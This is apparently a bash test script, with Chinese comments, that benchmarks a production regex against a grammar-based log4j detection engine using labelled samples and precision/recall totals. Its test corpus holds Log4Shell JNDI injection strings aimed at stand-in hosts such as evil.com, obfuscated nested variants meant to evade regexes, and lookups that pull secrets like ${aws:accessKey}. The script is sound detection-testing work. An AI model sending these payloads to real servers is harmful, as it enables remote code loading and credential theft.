#!/usr/bin/env bash
# ============================================================
# log4j 场景：正则 vs 语法规则（ANTLR）对比测试
# ------------------------------------------------------------
# 同一批 log4j 正/负样本，分别跑：
#   * 线上生产正则（grep -P 单条，模拟签名式检测）
#   * 引擎 log4j 规则插件（语法/语义检测，BLOCK 视为命中）
# 输出逐条命中对比 + TP/FP/FN/精确率/召回率汇总。
#
# 重点观察：
#   * 嵌套子语法混淆（${${lower:j}ndi:...} / ${env:${jndi:...}}）
#     会让"单层花括号"类正则失效，语法规则仍命中；
#   * 生产正则只覆盖 ldap:// 与 rmi://，且 (ower) 分支缺字母 l
#     （${lower:...} 实际命中不了）；大小写敏感，${JNDI:...} 漏报。
#
# usage: compare_log4j_regex.sh <engine_binary> <rules_dir>
# ============================================================
set -u

ENGINE="$1"
RULES="$2"

# ------------------------------------------------------------
# 正则集（name|pattern；PCRE）
# 当前只有一条：线上生产正则（用户提供，JSON 反序列化后）：
#   \${((.*jndi:((ldap://)|(rmi://)).+)|(.*\${((ower)|(upper)):.+)|(.*\${.*:.*:-.+)|(.*\${date:.+))}
# 原 JSON 写法："\\${((.*jndi:((ldap://)|(rmi://)).+)|(.*\\${((ower)|(upper)):.+)|(.*\\${.*:.*:-.+)|(.*\\${date:.+))}"
#
# 其他测试正则已注释保留：
#   'bare_jndi|(?i)jndi'
#   'basic_jndi|\$\{jndi:'
#   'brace_one_pair|\$\{[^}]*jndi[^}]*\}'
#   'loose_any|\$\{.*jndi'
#   'scheme_url|(?i)(ldap|ldaps|rmi|dns|iiop|corba|nis|nds)://'
#   'nested_brace|(?i)\$\{[^}]*\$\{'
#   'env_sys|\$\{(env|sys):'
# ------------------------------------------------------------
REGEXES=(
  'prod_pattern|\${((.*jndi:((ldap://)|(rmi://)).+)|(.*\${((ower)|(upper)):.+)|(.*\${.*:.*:-.+)|(.*\${date:.+))}'
)

# ------------------------------------------------------------
# 样本：ATTACK|payload|期望规则  /  BENIGN|payload
# 与 misc/validate_log4j.sh 同一语料 + 额外误报场景
# ------------------------------------------------------------
CASES=(
  'ATTACK|${jndi:ldap://127.0.0.1:1389/a}|log4j_jndi'
  'ATTACK|${jndi:rmi://evil.com/exp}|log4j_jndi'
  'ATTACK|${jndi:ldaps://evil.com:636/a}|log4j_jndi'
  'ATTACK|${jndi:dns://attacker.example}|log4j_jndi'
  'ATTACK|GET /q?x=${jndi:ldap://x/a}|log4j_jndi'
  'ATTACK|${${lower:j}ndi:ldap://evil.com/a}|log4j_jndi'
  'ATTACK|${${::-j}ndi:ldap://evil.com/a}|log4j_jndi'
  'ATTACK|${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://x}|log4j_jndi'
  'ATTACK|${env:${jndi:ldap://evil.com/a}}|log4j_jndi'
  'ATTACK|${jndi:${lower:l}dap://evil.com/a}|log4j_jndi'
  'ATTACK|${lower:${jndi:rmi://x/y}}|log4j_jndi'
  'ATTACK|$${jndi:ldap://evil.com/a}|log4j_jndi'
  'ATTACK|${env:HOME}|log4j_sensitive'
  'ATTACK|${sys:java.version}|log4j_sensitive'
  'ATTACK|${docker:containerId}|log4j_sensitive'
  'ATTACK|${aws:accessKey}|log4j_sensitive'
  'ATTACK|${lower:${upper:${env:PATH}}}|log4j_nested_chain'
  'ATTACK|${JNDI:LDAP://evil.com/x}|log4j_jndi'
  'BENIGN|hello world'
  'BENIGN|GET /index.html HTTP/1.1'
  'BENIGN|user=jndi'
  'BENIGN|price=10'
  'BENIGN|${java:version}'
  'BENIGN|${date:MM-dd-yyyy}'
  'BENIGN|INFO connecting to ldap://192.168.0.1'
  'BENIGN|${x${date:y}}'
)

# ------------------------------------------------------------
# 统计
# ------------------------------------------------------------
declare -A re_tp re_fp re_fn
declare -A eng_tp eng_fp eng_fn

print_cell() { # hit -> "  X" / "  -"
    if [[ "$1" == 1 ]]; then printf ' %-13s' 'X'; else printf ' %-13s' '-'; fi
}

echo "== 正则 vs 语法规则：逐条命中对比 =="
printf '%-38s %-16s' "payload" "engine"
for r in "${REGEXES[@]}"; do printf ' %-13s' "${r%%|*}"; done
echo

idx=0
for c in "${CASES[@]}"; do
    IFS='|' read -r kind payload expect_rule <<< "$c"
    idx=$((idx + 1))

    # engine：BLOCK 视为命中，记录首个命中规则
    out=$("$ENGINE" --rules "$RULES" "$payload" 2>&1)
    eng_rule=$(printf '%s\n' "$out" | grep -m1 -oP '!! \K\S+' || true)
    eng_hit=0
    if printf '%s\n' "$out" | grep -qE 'VERDICT: BLOCK'; then eng_hit=1; fi

    # 期望标签
    if [[ "$kind" == "ATTACK" ]]; then
        if [[ $eng_hit == 1 ]]; then eng_tp[ATTACK]=$(( ${eng_tp[ATTACK]:-0} + 1 )); else eng_fn[ATTACK]=$(( ${eng_fn[ATTACK]:-0} + 1 )); fi
    elif [[ $eng_hit == 1 ]]; then
        eng_fp[BENIGN]=$(( ${eng_fp[BENIGN]:-0} + 1 ))
    fi

    # 截断展示
    short=${payload:0:34}
    [[ ${#payload} -gt 34 ]] && short="${short}.."
    printf '%-38s' "$short"
    if [[ $eng_hit == 1 ]]; then printf ' %-16s' "${eng_rule:-BLOCK}"; else printf ' %-16s' '-'; fi

    for r in "${REGEXES[@]}"; do
        name=${r%%|*}
        pat=${r#*|}
        hit=0
        if printf '%s' "$payload" | grep -qP -- "$pat"; then hit=1; fi
        print_cell "$hit"
        if [[ "$kind" == "ATTACK" ]]; then
            if [[ $hit == 1 ]]; then re_tp[$name]=$(( ${re_tp[$name]:-0} + 1 )); else re_fn[$name]=$(( ${re_fn[$name]:-0} + 1 )); fi
        elif [[ $hit == 1 ]]; then
            re_fp[$name]=$(( ${re_fp[$name]:-0} + 1 ))
        fi
    done
    echo
done

# ------------------------------------------------------------
# 汇总
# ------------------------------------------------------------
n_attack=0; n_benign=0
for c in "${CASES[@]}"; do
    case "$c" in ATTACK\|*) n_attack=$((n_attack + 1));; *) n_benign=$((n_benign + 1));; esac
done

echo
echo "== 汇总（攻击样本=$n_attack, 良性样本=$n_benign）=="
printf '%-16s %5s %5s %5s %8s %8s\n' "detector" "TP" "FP" "FN" "precision" "recall"

report() {
    local name=$1 tp=$2 fp=$3 fn=$4
    local prec rec
    if (( tp + fp > 0 )); then prec=$(awk "BEGIN{printf \"%.2f\", $tp/($tp+$fp)}"); else prec="-"; fi
    if (( tp + fn > 0 )); then rec=$(awk "BEGIN{printf \"%.2f\", $tp/($tp+$fn)}"); else rec="-"; fi
    printf '%-16s %5d %5d %5d %8s %8s\n' "$name" "$tp" "$fp" "$fn" "$prec" "$rec"
}

report "engine(log4j)" "${eng_tp[ATTACK]:-0}" "${eng_fp[BENIGN]:-0}" "${eng_fn[ATTACK]:-0}"
for r in "${REGEXES[@]}"; do
    name=${r%%|*}
    report "$name" "${re_tp[$name]:-0}" "${re_fp[$name]:-0}" "${re_fn[$name]:-0}"
done

echo
echo '说明：engine 的 log4j_expr（LOW/ALLOW 结构识别）不参与 BLOCK 判定，'
echo '因此 ${java:version} / ${date:...} 这类良性结构计为未命中。'
